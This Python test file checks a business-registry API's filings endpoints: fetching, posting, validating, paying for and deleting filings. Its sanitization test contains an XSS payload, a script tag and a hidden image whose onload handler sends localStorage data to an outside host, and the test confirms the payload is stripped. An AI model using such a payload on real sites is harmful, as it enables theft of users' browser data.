# Copyright © 2019 Province of British Columbia
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests to assure the business-filing end-point.

Test-Suite to ensure that the /businesses endpoint is working as expected.
"""
import copy
from datetime import datetime
from http import HTTPStatus
from typing import Final
from unittest.mock import patch

import datedelta
import pytest
from dateutil.parser import parse
from flask import current_app
from minio.error import S3Error
from registry_schemas.example_data.schema_data import COURT_ORDER_FILING_TEMPLATE, RESTORATION
from reportlab.lib.pagesizes import letter
from registry_schemas.example_data import (
    ALTERATION_FILING_TEMPLATE,
    AMALGAMATION_APPLICATION,
    ANNUAL_REPORT,
    CHANGE_OF_ADDRESS,
    CHANGE_OF_DIRECTORS,
    CONTINUATION_IN,
    CORRECTION_AR,
    CORRECTION_INCORPORATION,
    CP_SPECIAL_RESOLUTION_TEMPLATE,
    DISSOLUTION,
    FILING_HEADER,
    INCORPORATION,
    INCORPORATION_FILING_TEMPLATE,
    REGISTRATION,
    SPECIAL_RESOLUTION,
    TRANSITION_FILING_TEMPLATE
)

from legal_api.models import Business, Filing, RegistrationBootstrap, UserRoles
from legal_api.resources.v2.business.business_filings.business_filings import ListFilingResource
from legal_api.services.authz import BASIC_USER, STAFF_ROLE
from legal_api.services.bootstrap import RegistrationBootstrapService
from legal_api.services.minio import MinioService
from legal_api.utils.legislation_datetime import LegislationDatetime
from tests import api_v2, integration_payment
from tests.unit.models import (  # noqa:E501,I001
    factory_business,
    factory_business_mailing_address,
    factory_completed_filing,
    factory_filing,
    factory_pending_filing,
    factory_user,
)
from tests.unit.services.filings.test_utils import _upload_file
from tests.unit.services.utils import create_header


@pytest.mark.parametrize(
    'legal_type, filing_type, filing_json',
    [
        ('BEN', 'incorporationApplication', INCORPORATION),
        ('CBEN', 'continuationIn', CONTINUATION_IN),
        ('BC', 'amalgamationApplication', AMALGAMATION_APPLICATION),
        ('SP', 'registration', REGISTRATION),
    ]
)
def test_get_temp_business_filing(session, client, jwt, legal_type, filing_type, filing_json):
    """Assert that the business info cannot be received in a valid JSONSchema format."""
    #
    # setup
    identifier = 'Tb31yQIuBw'
    temp_reg = RegistrationBootstrap()
    temp_reg._identifier = identifier
    temp_reg.save()
    json_data = copy.deepcopy(FILING_HEADER)
    json_data['filing']['header']['name'] = filing_type
    del json_data['filing']['business']
    filing_json = copy.deepcopy(filing_json)
    filing_json['nameRequest']['legalType'] = legal_type
    json_data['filing'][filing_type] = filing_json
    filings = factory_pending_filing(None, json_data)
    filings.temp_reg = identifier
    filings.save()

    #
    # test
    rv = client.get(f'/api/v2/businesses/{identifier}/filings',
                    headers=create_header(jwt, [STAFF_ROLE], identifier))

    #
    # validate
    assert rv.status_code == HTTPStatus.OK
    assert rv.json['filing']['header']['name'] == filing_type
    assert rv.json['filing'][filing_type] == filing_json


def test_get_one_business_filing_by_id(session, client, jwt):
    """Assert that the business info cannot be received in a valid JSONSchema format."""
    identifier = 'CP7654321'
    b = factory_business(identifier)
    filings = factory_filing(b, ANNUAL_REPORT)

    rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
                    headers=create_header(jwt, [STAFF_ROLE], identifier))

    assert rv.status_code == HTTPStatus.OK
    assert rv.json['filing']['annualReport'] == ANNUAL_REPORT['filing']['annualReport']
    assert rv.json['filing']['business'] == ANNUAL_REPORT['filing']['business']


def test_get_one_business_filing_by_id_raw_json(session, client, jwt):
    """Assert that the raw json originally submitted is returned."""
    identifier = 'CP7654321'
    b = factory_business(identifier)
    filings = factory_filing(b, ANNUAL_REPORT)

    rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings.id}?original=true',
                    headers=create_header(jwt, [STAFF_ROLE], identifier))

    assert rv.status_code == HTTPStatus.OK
    assert rv.json['filing']['annualReport'] == ANNUAL_REPORT['filing']['annualReport']
    assert rv.json['filing']['business'] == ANNUAL_REPORT['filing']['business']


def test_get_404_when_business_invalid_filing_id(session, client, jwt):
    """Assert that the business info cannot be received in a valid JSONSchema format."""
    identifier = 'CP7654321'
    b = factory_business(identifier)
    filings = factory_filing(b, ANNUAL_REPORT)

    print('test_get_one_business_filing - filing:', filings)

    print(f'/api/v2/businesses/{identifier}/filings/{filings.id}')

    rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings.id + 1}',
                    headers=create_header(jwt, [STAFF_ROLE], identifier))

    assert rv.status_code == HTTPStatus.NOT_FOUND
    assert rv.json == {'message': f'{identifier} no filings found'}


def test_get_empty_filings_with_invalid_business(session, client, jwt):
    """Assert that a filing cannot be created against non-existent business."""
    identifier = 'CP7654321'
    filings_id = 1

    rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings_id}',
                    headers=create_header(jwt, [STAFF_ROLE], identifier))

    assert rv.status_code == HTTPStatus.NOT_FOUND


def test_post_fail_if_given_filing_id(session, client, jwt):
    """Assert that a filing cannot be created against a given filing_id."""
    identifier = 'CP7654321'
    b = factory_business(identifier)
    filings = factory_filing(b, ANNUAL_REPORT)

    rv = client.post(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
                     json=ANNUAL_REPORT,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.FORBIDDEN
    assert rv.json['errors'][0] == {'message':
                                    f'Illegal to attempt to create a duplicate filing for {identifier}.'}


def test_post_filing_no_business(session, client, jwt):
    """Assert that a filing cannot be created against non-existent business."""
    identifier = 'CP7654321'

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=ANNUAL_REPORT,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.BAD_REQUEST
    assert rv.json['errors'][0] == {'message': 'A valid business is required.'}


def test_post_empty_annual_report_to_a_business(session, client, jwt):
    """Assert that an empty filing cannot be posted."""
    identifier = 'CP7654321'
    factory_business(identifier)

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=None,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code in (HTTPStatus.BAD_REQUEST, HTTPStatus.UNSUPPORTED_MEDIA_TYPE)

    if rv.status_code == HTTPStatus.UNSUPPORTED_MEDIA_TYPE:
        assert rv.json == {"detail": "Unsupported media type '' in request. 'application/json' is required."}

    if rv.status_code == HTTPStatus.BAD_REQUEST:
        assert rv.json['errors'][0] == {'message': f'No filing json data in body of post for {identifier}.'}


def test_post_authorized_draft_ar(session, client, jwt):
    """Assert that a unpaid filing can be posted."""
    identifier = 'CP7654321'
    factory_business(identifier)

    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
                     json=ANNUAL_REPORT,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.CREATED


def test_post_not_authorized_draft_ar(session, client, jwt):
    """Assert that a unpaid filing can be posted."""
    identifier = 'CP7654321'
    factory_business(identifier)

    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
                     json=ANNUAL_REPORT,
                     headers=create_header(jwt, [BASIC_USER], 'WRONGUSER')
                     )

    assert rv.status_code == HTTPStatus.UNAUTHORIZED


def test_post_not_allowed_historical(session, client, jwt):
    """Assert that a filing is not allowed for historical business."""
    identifier = 'CP7654321'
    factory_business(identifier, state=Business.State.HISTORICAL)

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=ANNUAL_REPORT,
                     headers=create_header(jwt, [BASIC_USER], 'WRONGUSER')
                     )

    assert rv.status_code == HTTPStatus.UNAUTHORIZED


def test_post_allowed_historical(session, client, jwt):
    """Assert that a filing is allowed for historical business."""
    identifier = 'BC7654321'
    factory_business(identifier, state=Business.State.HISTORICAL)

    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
                     json=COURT_ORDER_FILING_TEMPLATE,
                     headers=create_header(jwt, [STAFF_ROLE], 'user')
                     )

    assert rv.status_code == HTTPStatus.CREATED


def test_special_resolution_sanitation(session, client, jwt):
    """Assert that script tags can't be passed into special resolution resolution field."""
    identifier = 'BC7654399'
    factory_business(identifier, state=Business.State.ACTIVE)

    data = copy.deepcopy(FILING_HEADER)
    data['filing']['header']['name'] = 'specialResolution'
    data['filing']['specialResolution'] = copy.deepcopy(SPECIAL_RESOLUTION)
    data['filing']['specialResolution']['resolution'] = """
        <p>Hello this is great</p><script>alert("hello")</script>
        <img
            src="https://www.google.ca"
            style="display:none"
            onload="fetch('https://www.google.ca', {method: 'POST', body: localStorage.getItem('rfdsfds432432423423')})"
        >
        """
    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
                     json=data,
                     headers=create_header(jwt, [STAFF_ROLE], 'user')
                     )
    assert rv.status_code == HTTPStatus.CREATED
    assert rv.json['filing']['specialResolution']['resolution'] == ' <p>Hello this is great</p> '


def test_post_draft_ar(session, client, jwt):
    """Assert that a unpaid filing can be posted."""
    identifier = 'CP7654321'
    factory_business(identifier)

    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
                     json=ANNUAL_REPORT,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.CREATED
    assert not rv.json['filing']['header'].get('paymentToken')
    assert rv.json['filing']['header']['filingId']


def test_post_only_validate_ar(session, client, jwt):
    """Assert that a unpaid filing can be posted."""
    identifier = 'CP7654321'
    factory_business(identifier,
                     founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
                     last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date())

    ar = copy.deepcopy(ANNUAL_REPORT)
    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
    if annual_report_date > datetime.utcnow().date():
        annual_report_date = datetime.utcnow().date()
    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()

    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.OK
    assert not rv.json.get('errors')


def test_post_validate_ar_using_last_ar_date(session, client, jwt):
    """Assert that a unpaid filing can be posted."""
    identifier = 'CP7654321'
    factory_business(identifier,
                     last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date(),
                     founding_date=(datetime.utcnow() - datedelta.datedelta(years=2))  # founding date = 2 years ago
                     )
    ar = copy.deepcopy(ANNUAL_REPORT)
    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
    if annual_report_date > datetime.utcnow().date():
        annual_report_date = datetime.utcnow().date()
    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()

    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.OK
    assert not rv.json.get('errors')


def test_validate_filing_json_for_filing_type(session, client, jwt):
    """Assert that filing type is in filing json."""
    import copy
    identifier = 'CP7654321'
    factory_business(identifier)

    ar = copy.deepcopy(ANNUAL_REPORT)
    ar['filing']['header'].pop('name')

    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.BAD_REQUEST
    assert rv.json.get('errors')
    assert rv.json['errors'][0] == {'message': 'filing/header/name is a required property'}


def test_post_only_validate_ar_invalid_routing_slip(session, client, jwt):
    """Assert that a unpaid filing can be posted."""
    import copy
    identifier = 'CP7654321'
    factory_business(identifier)

    ar = copy.deepcopy(ANNUAL_REPORT)
    ar['filing']['header']['routingSlipNumber'] = '1231313329988888'

    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.UNPROCESSABLE_ENTITY
    assert rv.json.get('errors')
    assert rv.json['errors'][0]['error'] == "'1231313329988888' is too long"

    ar['filing']['header']['routingSlipNumber'] = '1'

    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.UNPROCESSABLE_ENTITY
    assert rv.json.get('errors')


def test_post_validate_ar_valid_routing_slip(session, client, jwt):
    """Assert that a unpaid filing can be posted."""
    identifier = 'CP7654321'
    factory_business(identifier,
                     founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
                     last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date())

    ar = copy.deepcopy(ANNUAL_REPORT)
    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
    if annual_report_date > datetime.utcnow().date():
        annual_report_date = datetime.utcnow().date()
    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['header']['routingSlipNumber'] = '123131332'

    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.OK
    assert not rv.json.get('errors')


@integration_payment
def test_post_valid_ar(session, client, jwt):
    """Assert that a filing can be completed up to payment."""
    from legal_api.models import Filing
    identifier = 'CP7654321'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.YEAR)
                                )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )
    # check return
    assert rv.status_code == HTTPStatus.CREATED
    assert not rv.json.get('errors')
    assert rv.json['filing']['header']['filingId']
    assert rv.json['filing']['header']['paymentToken']
    assert rv.json['filing']['header']['paymentToken'] == '1'

    # check stored filing
    filing = Filing.get_filing_by_payment_token(rv.json['filing']['header']['paymentToken'])
    assert filing
    assert filing.status == Filing.Status.PENDING.value


@integration_payment
def test_payment_header(session, client, jwt):
    """Assert that a filing can be completed up to payment."""
    from legal_api.models import Filing
    identifier = 'CP7654321'
    payment_account = '12345'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.YEAR)
                                )
    factory_business_mailing_address(business)
    data = copy.deepcopy(FILING_HEADER)
    data['filing']['header']['name'] = 'specialResolution'
    data['filing']['specialResolution'] = SPECIAL_RESOLUTION

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=data,
                     headers=create_header(jwt, [STAFF_ROLE], identifier, **{'accountID': payment_account})
                     )
    # check return
    assert rv.status_code == HTTPStatus.CREATED
    assert not rv.json.get('errors')
    assert rv.json['filing']['header']['filingId']

    # check stored filing
    filing = Filing.find_by_id(rv.json['filing']['header']['filingId'])
    assert filing
    assert filing.payment_account == payment_account


@integration_payment
def test_cancel_payment_for_pending_filing(session, client, jwt):
    """Assert that a filing can be completed up to payment."""
    from legal_api.models import Filing
    identifier = 'CP7654321'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.YEAR)
                                )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    # check return
    assert rv.status_code == HTTPStatus.CREATED
    assert not rv.json.get('errors')
    assert rv.json['filing']['header']['filingId']
    assert rv.json['filing']['header']['paymentToken']

    # check stored filing
    filing = Filing.get_filing_by_payment_token(rv.json['filing']['header']['paymentToken'])
    assert filing
    assert filing.status == Filing.Status.PENDING.value

    filing_id = rv.json['filing']['header']['filingId']
    rv = client.patch(f'/api/v2/businesses/{identifier}/filings/{filing_id}', json={},
                      headers=create_header(jwt, [STAFF_ROLE], identifier))
    assert rv.status_code == HTTPStatus.ACCEPTED
    assert not rv.json.get('errors')
    assert rv.json['filing']['header'].get('paymentToken', None) is None
    assert rv.json['filing']['header']['status'] == 'DRAFT'


@integration_payment
def test_post_valid_ar_with_routing_slip(session, client, jwt):
    """Assert that a filing can be completed up to payment."""
    from legal_api.models import Filing
    identifier = 'CP7654321'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.YEAR)
                                )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['header']['routingSlipNumber'] = '123131332'

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    # check return
    assert rv.status_code == HTTPStatus.CREATED
    assert not rv.json.get('errors')
    assert rv.json['filing']['header']['filingId']
    assert rv.json['filing']['header']['paymentToken']

    # check stored filing
    filing = Filing.get_filing_by_payment_token(rv.json['filing']['header']['paymentToken'])
    assert filing
    assert filing.status == Filing.Status.PENDING.value


def test_post_valid_ar_failed_payment(monkeypatch, session, client, jwt):
    """Assert that a unpaid filing can be posted."""
    identifier = 'CP7654321'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
                                last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
                                )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
    if annual_report_date > datetime.utcnow().date():
        annual_report_date = datetime.utcnow().date()
    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['business']['identifier'] = 'CP7654321'
    ar['filing']['business']['legalType'] = Business.LegalTypes.COOP.value

    old_svc = current_app.config.get('PAYMENT_SVC_URL')
    current_app.config['PAYMENT_SVC_URL'] = 'http://nowhere.localdomain'

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    current_app.config['PAYMENT_SVC_URL'] = old_svc
    assert rv.status_code == HTTPStatus.PAYMENT_REQUIRED
    assert rv.json.get('errors')
    assert rv.json['errors'][0]['message'] == 'unable to create invoice for payment.'


@integration_payment
def test_cancel_payment_failed_connection_pay_api(monkeypatch, session, client, jwt):
    """Assert that cancel payment failure returns error."""
    identifier = 'CP7654321'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.YEAR)
                                )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    # check return
    assert rv.status_code == HTTPStatus.CREATED
    assert not rv.json.get('errors')
    assert rv.json['filing']['header']['filingId']
    assert rv.json['filing']['header']['paymentToken']

    filing_id = rv.json['filing']['header']['filingId']

    old_svc = current_app.config.get('PAYMENT_SVC_URL')
    current_app.config['PAYMENT_SVC_URL'] = 'http://nowhere.localdomain'

    rv = client.patch(f'/api/v2/businesses/{identifier}/filings/{filing_id}',
                      json={},
                      headers=create_header(jwt, [STAFF_ROLE], identifier)
                      )

    current_app.config['PAYMENT_SVC_URL'] = old_svc
    assert rv.status_code == HTTPStatus.INTERNAL_SERVER_ERROR
    assert rv.json.get('errors')
    assert rv.json['errors'][0]['message'] == 'Unable to cancel payment for the filing.'


@integration_payment
def test_update_annual_report_to_a_business(session, client, jwt):
    """Assert that a filing can be updated if not paid."""
    identifier = 'CP7654321'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.YEAR)
                                )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    ar['filing']['header']['date'] = (datetime.utcnow().date() - datedelta.MONTH).isoformat()
    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
    filings = factory_filing(business, ar)
    ar['filing']['header']['date'] = datetime.utcnow().date().isoformat()

    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
                    json=ar,
                    headers=create_header(jwt, [STAFF_ROLE], identifier)
                    )

    ar['filing']['header']['submitter'] = identifier
    ar['filing']['header']['date'] = rv.json['filing']['header']['date']
    assert rv.status_code == HTTPStatus.ACCEPTED
    assert rv.json['filing']['business'] == ar['filing']['business']
    assert rv.json['filing']['annualReport'] == ar['filing']['annualReport']
    assert rv.json['filing']['header']['filingId']
    assert rv.json['filing']['header']['submitter']
    assert rv.json['filing']['header']['paymentToken']


@integration_payment
def test_payment_failed(session, client, jwt):
    """Assert that a failed call to a BCOL payment returns an error code and message."""
    identifier = 'CP7654321'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.YEAR)
                                )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()

    old_svc = current_app.config.get('PAYMENT_SVC_URL')
    current_app.config['PAYMENT_SVC_URL'] = old_svc + '?__code=400'

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    current_app.config['PAYMENT_SVC_URL'] = old_svc

    # check return
    assert rv.status_code == HTTPStatus.PAYMENT_REQUIRED
    assert rv.json.get('errors')


def test_update_draft_ar(session, client, jwt):
    """Assert that a valid filing can be updated to a paid filing."""
    import copy
    identifier = 'CP7654321'
    b = factory_business(identifier)
    filings = factory_filing(b, ANNUAL_REPORT)
    ar = copy.deepcopy(ANNUAL_REPORT)

    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id}?draft=true',
                    json=ar,
                    headers=create_header(jwt, [STAFF_ROLE], identifier)
                    )

    assert rv.status_code == HTTPStatus.ACCEPTED
    assert rv.json['filing']['business'] == ar['filing']['business']
    assert rv.json['filing']['annualReport'] == ar['filing']['annualReport']
    assert not rv.json['filing']['header'].get('paymentToken')
    assert rv.json['filing']['header']['filingId'] == filings.id


def test_delete_filing_in_draft(session, client, jwt):
    """Assert that a draft filing can be deleted."""
    identifier = 'CP7654321'
    b = factory_business(identifier)
    filings = factory_filing(b, ANNUAL_REPORT)
    headers = create_header(jwt, [STAFF_ROLE], identifier)

    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
                       headers=headers
                       )

    assert rv.status_code == HTTPStatus.OK


def test_delete_coop_ia_filing_in_draft_with_file_in_minio(session, client, jwt, minio_server):
    """Assert that a draft filing can be deleted."""
    identifier = 'T1234567'
    temp_reg = RegistrationBootstrap()
    temp_reg._identifier = identifier
    temp_reg.save()

    filing_json = copy.deepcopy(INCORPORATION_FILING_TEMPLATE)
    filing_json['filing']['business']['legalType'] = 'CP'
    del filing_json['filing']['incorporationApplication']['offices']['recordsOffice']
    del filing_json['filing']['incorporationApplication']['parties'][1]
    del filing_json['filing']['incorporationApplication']['shareStructure']
    del filing_json['filing']['incorporationApplication']['incorporationAgreement']
    filing_json['filing']['incorporationApplication']['cooperative'] = {
        'cooperativeAssociationType': 'CP'
    }

    rules_file_key = _upload_file(letter, invalid=False)
    memorandum_file_key = _upload_file(letter, invalid=False)
    filing_json['filing']['incorporationApplication']['cooperative']['rulesFileKey'] = rules_file_key
    filing_json['filing']['incorporationApplication']['cooperative']['memorandumFileKey'] = memorandum_file_key
    filing = factory_filing(Business(), filing_json, filing_type='incorporationApplication')
    filing.temp_reg = identifier
    filing.save()

    headers = create_header(jwt, [STAFF_ROLE], identifier)
    with patch.object(RegistrationBootstrapService, 'deregister_bootstrap', return_value=HTTPStatus.OK):
        with patch.object(RegistrationBootstrapService, 'delete_bootstrap', return_value=HTTPStatus.OK):
            rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filing.id}', headers=headers)

            assert rv.status_code == HTTPStatus.OK
            try:
                MinioService.get_file_info(rules_file_key)
            except S3Error as ex:
                assert ex.code == 'NoSuchKey'

            try:
                MinioService.get_file_info(memorandum_file_key)
            except S3Error as ex:
                assert ex.code == 'NoSuchKey'

def test_delete_continuation_in_filing_with_authorization_files_in_draft(session, client, jwt, minio_server):
    """Assert that a draft continuationIn filing can be deleted and authorization files are removed from Minio."""
    identifier = 'CP1234568'

    b = factory_business(identifier)
    filing_json = copy.deepcopy(FILING_HEADER)
    filing_json['filing']['header']['name'] = 'continuationIn'
    filing_json['filing']['business']['legalType'] = 'CP'
    filing_json['filing']['continuationIn'] = {
        "foreignJurisdiction": {},
        "authorization": {
            "files": []
        }
    }
    file_key_1 = _upload_file(letter, invalid=False)
    file_key_2 = _upload_file(letter, invalid=False)
    filing_json['filing']['continuationIn']['authorization']['files'] = [
        {"fileKey": file_key_1},
        {"fileKey": file_key_2}
    ]
    filing = factory_filing(b, filing_json, filing_type='continuationIn')
    headers = create_header(jwt, [STAFF_ROLE], identifier)
    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filing.id}', headers=headers)

    assert rv.status_code == HTTPStatus.OK
    for file_key in [file_key_1, file_key_2]:
        try:
            MinioService.get_file_info(file_key)
        except S3Error as ex:
            assert ex.code == 'NoSuchKey'


def test_delete_continuation_in_filing_with_affidavit_in_draft(session, client, jwt, minio_server):
    """Assert that a draft continuationIn filing can be deleted and the affidavit file is removed from Minio."""
    identifier = 'CP1234567'

    b = factory_business(identifier)
    filing_json = copy.deepcopy(FILING_HEADER)
    filing_json['filing']['header']['name'] = 'continuationIn'
    filing_json['filing']['business']['legalType'] = 'CP'
    filing_json['filing']['continuationIn'] = {
        "foreignJurisdiction": {},
        "authorization": {
            "files": []
        }
    }
    file_key = _upload_file(letter, invalid=False)
    filing_json['filing']['continuationIn']['foreignJurisdiction']['affidavitFileKey'] = file_key
    filing = factory_filing(b, filing_json, filing_type='continuationIn')
    headers = create_header(jwt, [STAFF_ROLE], identifier)
    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filing.id}', headers=headers)

    assert rv.status_code == HTTPStatus.OK
    try:
        MinioService.get_file_info(file_key)
    except S3Error as ex:
        assert ex.code == 'NoSuchKey'


def test_delete_dissolution_filing_in_draft_with_file_in_minio(session, client, jwt, minio_server):
    """Assert that a draft filing can be deleted."""
    identifier = 'CP7654321'

    b = factory_business(identifier)
    filing_json = copy.deepcopy(FILING_HEADER)
    filing_json['filing']['header']['name'] = 'dissolution'
    filing_json['filing']['business']['legalType'] = 'CP'
    filing_json['filing']['dissolution'] = copy.deepcopy(DISSOLUTION)
    file_key = _upload_file(letter, invalid=False)
    filing_json['filing']['dissolution']['affidavitFileKey'] = file_key
    filing = factory_filing(b, filing_json, filing_type='dissolution')
    headers = create_header(jwt, [STAFF_ROLE], identifier)
    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filing.id}', headers=headers)

    assert rv.status_code == HTTPStatus.OK
    try:
        MinioService.get_file_info(file_key)
    except S3Error as ex:
        assert ex.code == 'NoSuchKey'


def test_delete_filing_block_completed(session, client, jwt):
    """Assert that a completed filing cannot be deleted."""
    import copy
    identifier = 'CP7654321'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.YEAR)
                                )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()

    filings = factory_completed_filing(business, ar)

    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
                       headers=create_header(jwt, [STAFF_ROLE], identifier)
                       )

    assert rv.status_code == HTTPStatus.FORBIDDEN


def test_delete_filing_no_filing_id(client, jwt):
    """Assert that a call without an ID is a BAD_REQUEST."""
    identifier = 'CP7654321'
    rv = client.delete(f'/api/v2/businesses/{identifier}/filings',
                       headers=create_header(jwt, [STAFF_ROLE], identifier)
                       )

    assert rv.status_code == HTTPStatus.BAD_REQUEST


def test_delete_filing_missing_filing_id(client, jwt):
    """Assert that trying to delete a non-existant filing returns a 404."""
    identifier = 'CP7654321'
    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/123451234512345',
                       headers=create_header(jwt, [STAFF_ROLE], identifier)
                       )

    assert rv.status_code in (HTTPStatus.NOT_FOUND, HTTPStatus.INTERNAL_SERVER_ERROR)


def test_delete_filing_not_authorized(session, client, jwt):
    """Assert that a users is authorized to delete a filing."""
    identifier = 'CP7654321'
    b = factory_business(identifier)
    filings = factory_filing(b, ANNUAL_REPORT)
